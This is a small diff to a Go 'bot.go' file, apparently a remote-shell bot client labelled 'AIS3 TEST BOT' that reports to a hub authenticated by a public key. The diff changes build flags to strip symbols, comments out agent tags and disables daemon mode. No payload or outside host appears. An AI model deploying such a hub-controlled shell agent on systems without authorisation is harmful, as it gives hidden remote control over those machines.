@@ -1,4 +1,4 @@
-// go build bot.go
+//go build -ldflags="-s -w" -tags="extra mod" -o bot-all bot.go
 package main
 
 import (
@@ -19,10 +19,10 @@ func main() {
 
 	c := base.NewClientM()
 	c.UUID = kit.HashBytes256([]byte("AIS3 TEST BOT"))
-	c.AgentTag = "AIS3 TEST BOT"
-	c.HubKeyTag = "HELLO"
+//	c.AgentTag = "AIS3 TEST BOT"
+//	c.HubKeyTag = "HELLO"
 	c.HubPubKey = hubPubKey
-	c.Daemon = true
+	c.Daemon = false
 	c.AutoClean = true
 	c.Info.Set("AIS3", "test shell XD")
 //	c.Info.Set("AIS3-2", "test2")
